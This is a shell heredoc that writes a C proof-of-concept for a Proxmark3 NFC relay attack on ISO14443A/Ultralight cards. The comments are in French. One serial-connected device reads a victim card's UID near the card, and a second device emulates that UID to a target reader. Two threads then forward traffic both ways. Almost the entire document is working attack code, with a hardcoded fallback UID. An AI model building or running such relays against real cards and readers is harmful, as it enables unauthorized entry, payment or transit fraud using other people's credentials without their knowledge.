cat << 'EOF' > poc_relay.c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <process.h>

#define PROXY_PORT "\\\\.\\COM9"
#define MOLE_PORT  "\\\\.\\COM10"
#define BAUD_RATE  460800

HANDLE hProxy, hMole;

// --- FONCTIONS UTILITAIRES ---

HANDLE init_serial(const char* port) {
    printf("[*] Ouverture de %s...\n", port);
    HANDLE h = CreateFile(port, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    
    if (h == INVALID_HANDLE_VALUE) {
        printf("[!] Erreur CreateFile: %ld (Le port est-il deja ouvert ailleurs ?)\n", GetLastError());
        return NULL;
    }

    DCB dcb = {0};
    dcb.DCBlength = sizeof(dcb);
    if (!GetCommState(h, &dcb)) {
        printf("[!] Erreur GetCommState: %ld\n", GetLastError());
        CloseHandle(h);
        return NULL;
    }

    dcb.BaudRate = BAUD_RATE;
    dcb.ByteSize = 8;
    dcb.StopBits = ONESTOPBIT;
    dcb.Parity = NOPARITY;
    
    if (!SetCommState(h, &dcb)) {
        printf("[!] Erreur SetCommState: %ld\n", GetLastError());
        CloseHandle(h);
        return NULL;
    }

    COMMTIMEOUTS timeouts = {0};
    timeouts.ReadIntervalTimeout = 20; 
    timeouts.ReadTotalTimeoutConstant = 100;
    SetCommTimeouts(h, &timeouts);

    printf("[+] %s est pret.\n", port);
    return h;
}

void send_cmd(HANDLE h, const char* cmd) {
    char buffer[256];
    DWORD written;
    sprintf(buffer, "%s\n", cmd);
    WriteFile(h, buffer, (DWORD)strlen(buffer), &written, NULL);
}

// Récupère l'UID depuis la sortie du Mole
void get_uid_from_mole(char* out_uid) {
    char buf[4096];
    DWORD bytesRead;
    printf("[*] Scan de la carte (hf 14a info) sur le Mole...\n");
    
    // Nettoyage pour ne pas lire de vieux restes
    PurgeComm(hMole, PURGE_RXCLEAR | PURGE_TXCLEAR);
    
    // Commande standard pour identifier un tag Ultralight/14443A
    send_cmd(hMole, "script run hf_mole_relay");
    
    Sleep(1500); // Temps pour le scan radio et le retour texte
    ReadFile(hMole, buf, sizeof(buf)-1, &bytesRead, NULL);
    buf[bytesRead] = '\0';

    // Recherche du mot-clé "UID:" dans le texte renvoyé
    char* p = strstr(buf, "UID:");
    if (!p) p = strstr(buf, "UID :"); // Gestion espace potentiel

    if (p) {
        // On se place après "UID:"
        char* start = strstr(p, ":") + 1;
        int i = 0, j = 0;
        
        // On extrait les caractères hexadécimaux en ignorant les espaces
        // jusqu'à la fin de la ligne ou un caractère non-hex
        while (start[i] != '\r' && start[i] != '\n' && j < 31) {
            if ((start[i] >= '0' && start[i] <= '9') || 
                (start[i] >= 'A' && start[i] <= 'F') || 
                (start[i] >= 'a' && start[i] <= 'f')) {
                out_uid[j++] = start[i];
            }
            i++;
        }
        out_uid[j] = '\0';
        
        if (strlen(out_uid) > 0) {
            printf("[+] UID extrait avec succes : %s\n", out_uid);
        } else {
            goto error;
        }
    } else {
        error:
        printf("[!] UID non trouve dans la sortie de hf 14a info.\n");
        printf("[*] DEBUG: Voici ce que le Mole a repondu :\n%s\n", buf);
        strcpy(out_uid, "045978CA341290"); // Fallback
    }
}

// --- THREADS DE RELAI ---

void relay_thread(void* params) {
    HANDLE src = ((HANDLE*)params)[0];
    HANDLE dst = ((HANDLE*)params)[1];
    char* label = (char*)((HANDLE*)params)[2];
    
    char buf[1024];
    DWORD bytesRead, bytesWritten;

    while(1) {
        if (ReadFile(src, buf, sizeof(buf)-1, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            // On affiche uniquement si ça ressemble à de la data (évite le bruit)
            // if (strstr(buf, "rx") || strstr(buf, "dist") || strstr(buf, "ok")) {
            //     printf("[%s]: %s", label, buf);
            // }
            printf("[%s]: %s", label, buf);
            WriteFile(dst, buf, bytesRead, &bytesWritten, NULL);
        }
    }
}

int main() {
    printf("=== POC RELAI PROXMARK3 ULTRALIGHT ===\n");
    hProxy = init_serial(PROXY_PORT);
    hMole = init_serial(MOLE_PORT);
    printf("[*] Ports série ouverts.\n");

    if (!hProxy || !hMole) {
        printf("[!] Erreur d'ouverture des ports COM.\n");
        return 1;
    }
    printf("[*] Initialisation du Mole...\n");

    char uid[32] = {0};
    get_uid_from_mole(uid);

    printf("[*] Initialisation du Proxy avec l'UID %s...\n", uid);
    char sim_cmd[128];
    printf("[*] Lancement de la simulation sur le Proxy...\n");
    sprintf(sim_cmd, "hf 14a sim -t 2 -u %s", uid);
    send_cmd(hProxy, sim_cmd);
    printf("[*] Simulation lancée. En attente du lecteur cible...\n");
    Sleep(500);
    printf("[*] Simulation active. En attente du lecteur cible...\n");

    // Préparation des paramètres pour les threads

    static HANDLE p1[3]; 
    p1[0] = hProxy; p1[1] = hMole; p1[2] = (HANDLE)"LECTEUR";
    printf("=== RELAI ACTIF (CTRL+C pour stopper) ===\n");
    static HANDLE p2[3]; 
    p2[0] = hMole; p2[1] = hProxy; p2[2] = (HANDLE)"TAG";

_beginthread(relay_thread, 0, p1);
_beginthread(relay_thread, 0, p2);

    while(1) Sleep(1000);

    return 0;
}
EOF